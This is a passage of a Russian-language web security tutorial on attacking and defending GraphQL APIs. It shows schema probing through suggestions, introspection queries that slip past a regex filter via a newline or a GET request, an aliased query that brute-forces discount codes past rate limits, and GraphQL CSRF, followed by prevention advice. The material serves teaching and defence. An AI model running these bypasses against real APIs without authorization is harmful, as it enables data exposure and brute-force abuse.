    Если интроспекция включена, но приведенный выше запрос не выполняется, попробуйте удалить директивы onOperation, onFragment и onField из структуры запроса. Многие конечные точки не принимают эти директивы как часть запроса интроспекции, и вы часто можете добиться большего успеха с интроспекцией, удалив их.

Визуализация результатов интроспекции

Ответы на запросы интроспекции могут быть полны информации, но часто очень длинны и сложны для обработки.

Вы можете более легко просматривать отношения между сущностями схемы, используя визуализатор GraphQL. Это онлайн-инструмент, который берет результаты запроса интроспекции и создает визуальное представление возвращенных данных, включая отношения между операциями и типами.
Подсказки (Suggestions)

Даже если интроспекция полностью отключена, вы иногда можете использовать подсказки (suggestions), чтобы получить информацию о структуре API.

Подсказки — это функция платформы Apollo GraphQL, в которой сервер может предлагать исправления запросов в сообщениях об ошибках. Они обычно используются, когда запрос слегка неверен, но все же узнаваем (например, There is no entry for 'productInfo'. Did you mean 'productInformation' instead?).

Вы можете потенциально извлечь полезную информацию из этого, поскольку ответ, по сути, выдает действительные части схемы.

Clairvoyance — это инструмент, который использует подсказки для автоматического восстановления всей или части схемы GraphQL, даже когда интроспекция отключена. Это значительно сокращает время, необходимое для сбора информации из ответов с подсказками.

Вы не можете напрямую отключить подсказки в Apollo. См. эту ветку на GitHub для обходного решения.

    Burp Scanner может автоматически тестировать подсказки в ходе своих сканирований. Если обнаружены активные подсказки, Burp Scanner сообщает о проблеме «GraphQL suggestions enabled».

Лабораторные работы
text

ЛАБОРАТОРНАЯ
APPRENTICE
Доступ к приватным записям GraphQL
Не решена

ЛАБОРАТОРНАЯ
PRACTITIONER
Случайное раскрытие приватных полей GraphQL
Не решена

Обход защиты от интроспекции GraphQL

Если вы не можете выполнить запросы интроспекции для тестируемого API, попробуйте вставить специальный символ после ключевого слова __schema.

Когда разработчики отключают интроспекцию, они могут использовать регулярное выражение для исключения ключевого слова __schema в запросах. Вы должны попробовать такие символы, как пробелы, новые строки и запятые, поскольку они игнорируются GraphQL, но не flawed regex.

Таким образом, если разработчик исключил только __schema{, то приведенный ниже запрос интроспекции не будет исключен.
graphql

# Запрос интроспекции с новой строкой
{
    "query": "query{__schema
    {queryType{name}}}"
}

Если это не сработает, попробуйте запустить проверку с использованием альтернативного метода запроса, поскольку интроспекция может быть отключена только для POST. Попробуйте GET-запрос или POST-запрос с content-type x-www-form-urlencoded.

В примере ниже показана проверка интроспекции, отправленная через GET, с URL-кодированными параметрами.
text

# Проверка интроспекции как GET-запрос
GET /graphql?query=query%7B__schema%0A%7BqueryType%7Bname%7D%7D%7D

    Вы можете сохранять GraphQL запросы на карту сайта. Для получения дополнительной информации см. «Работа с GraphQL».

text

ЛАБОРАТОРНАЯ
PRACTITIONER
Поиск скрытой конечной точки GraphQL
Не решена

Обход ограничения скорости с использованием псевдонимов

Обычно объекты GraphQL не могут содержать несколько свойств с одинаковым именем. Псевдонимы позволяют обойти это ограничение, явно называя свойства, которые вы хотите вернуть из API. Вы можете использовать псевдонимы для возврата нескольких экземпляров одного и того же типа объекта в одном запросе.
Дополнительная информация

Для получения дополнительной информации о псевдонимах GraphQL см. раздел «Псевдонимы».

Хотя псевдонимы предназначены для ограничения количества необходимых вызовов API, их также можно использовать для перебора конечной точки GraphQL.

Многие конечные точки имеют какой-либо ограничитель скорости (rate limiter), чтобы предотвратить атаки перебором. Некоторые ограничители скорости работают на основе количества полученных HTTP-запросов, а не количества операций, выполненных с конечной точкой. Поскольку псевдонимы фактически позволяют отправлять несколько запросов в одном HTTP-сообщении, они могут обойти это ограничение.

Упрощенный пример ниже показывает серию запросов с псевдонимами, проверяющих, действительны ли скидочные коды магазина. Эта операция потенциально может обойти ограничение скорости, поскольку это один HTTP-запрос, даже though it could potentially be used to check a vast number of discount codes at once.
graphql

# Запрос с псевдонимами
query isValidDiscount($code: Int) {
    isValidDiscount(code:$code){
        valid
    }
    isValidDiscount2: isValidDiscount(code:$code){
        valid
    }
    isValidDiscount3: isValidDiscount(code:$code){
        valid
    }
}

text

ЛАБОРАТОРНАЯ
PRACTITIONER
Обход защит от перебора GraphQL
Не решена

CSRF в GraphQL

Уязвимости межсайтовой подделки запроса (CSRF) позволяют злоумышленнику побудить пользователей выполнить действия, которые они не собирались выполнять. Это делается путем создания вредоносного веб-сайта, который подделывает межсайтовый запрос к уязвимому приложению.
Дополнительная информация

Для получения общей информации об уязвимостях CSRF см. раздел академии по CSRF.

GraphQL можно использовать в качестве вектора для CSRF-атак, когда злоумышленник создает эксплойт, вызывающий отправку браузером жертвы вредоносного запроса от имени пользователя-жертвы.
Как возникают уязвимости CSRF в GraphQL?

Уязвимости CSRF могут возникать, когда конечная точка GraphQL не проверяет тип содержимого (content-type) отправляемых ей запросов и не реализованы CSRF-токены.

POST-запросы, использующие content-type application/json, защищены от подделки, пока тип содержимого проверяется. В этом случае злоумышленник не сможет заставить браузер жертвы отправить этот запрос, даже если жертва посетит вредоносный сайт.

Однако альтернативные методы, такие как GET, или любой запрос, имеющий content-type x-www-form-urlencoded, могут быть отправлены браузером и поэтому могут оставлять пользователей уязвимыми для атак, если конечная точка принимает такие запросы. Когда это так, злоумышленники могут создавать эксплойты для отправки вредоносных запросов к API.

Шаги по построению CSRF-атаки и доставке эксплойта одинаковы для уязвимостей CSRF на основе GraphQL и для «обычных» уязвимостей CSRF. Для получения дополнительной информации об этом процессе см. «Как построить CSRF-атаку».
text

ЛАБОРАТОРНАЯ
PRACTITIONER
Выполнение CSRF-эксплойтов через GraphQL
Не решена

Предотвращение атак на GraphQL

Чтобы предотвратить многие распространенные атаки на GraphQL, выполните следующие шаги при развертывании вашего API в production:

    Если ваш API не предназначен для общего пользования, отключите на нем интроспекцию. Это усложняет злоумышленнику получение информации о работе API и снижает риск нежелательного раскрытия информации.

        Информацию о том, как отключить интроспекцию в платформе Apollo GraphQL, см. в этом блоге.

    Если ваш API предназначен для общего пользования, то вам, вероятно, нужно оставить интроспекцию включенной. Однако вы должны просмотреть схему API, чтобы убедиться, что она не раскрывает непреднамеренные поля публично.

    Убедитесь, что подсказки отключены. Это предотвращает возможность использования злоумышленниками Clairvoyance или подобных инструментов для получения информации о базовой схеме.

        Вы не можете напрямую отключить подсказки в Apollo. См. эту ветку на GitHub для обходного решения.

    Убедитесь, что схема вашего API не раскрывает никаких приватных полей пользователя, таких как адреса электронной почты или идентификаторы пользователей.

Предотвращение атак перебором на GraphQL

Иногда возможно обойти стандартное ограничение скорости при использовании GraphQL API. Для примера этого см. раздел «Обход ограничения скорости с использованием псевдонимов».

Имея это в виду, есть шаги по проектированию, которые вы можете предпринять, чтобы защитить ваш API от атак перебором. Это обычно включает ограничение сложности запросов, принимаемых API, и сокращение возможностей для злоумышленников выполнять атаки на отказ в обслуживании (DoS).

Для защиты от атак перебором:

    Ограничьте глубину запроса (query depth) вашего API. Термин «глубина запроса» относится к количеству уровней вложенности в запросе. Сильно вложенные запросы могут иметь значительные последствия для производительности и потенциально предоставить возможность для DoS-атак, если они принимаются. Ограничивая глубину запроса, которую принимает ваш API, вы можете снизить вероятность этого.

    Настройте ограничения на операции (operation limits). Ограничения операций позволяют вам настроить максимальное количество уникальных полей, псевдонимов и корневых полей, которые ваш API может принять.

    Настройте максимальное количество байт, которое может содержать запрос.

    Рассмотрите возможность внедрения анализа стоимости (cost analysis) в ваш API. Анализ стоимости — это процесс, при котором библиотечное приложение определяет стоимость ресурсов, связанную с выполнением запросов по мере их получения. Если запрос будет слишком сложным для выполнения, API отклоняет его.

Дополнительная информация

Для информации о том, как реализовать эти функции в Apollo, см. этот блог.
Предотвращение CSRF в GraphQL

Чтобы защититься от уязвимостей CSRF в GraphQL, убедитесь в следующем при проектировании вашего API:

    Ваш API принимает запросы только через JSON-кодированные POST.

    API проверяет, что предоставленное содержимое соответствует указанному типу содержимого (content-type).

    API имеет безопасный механизм CSRF-токенов.
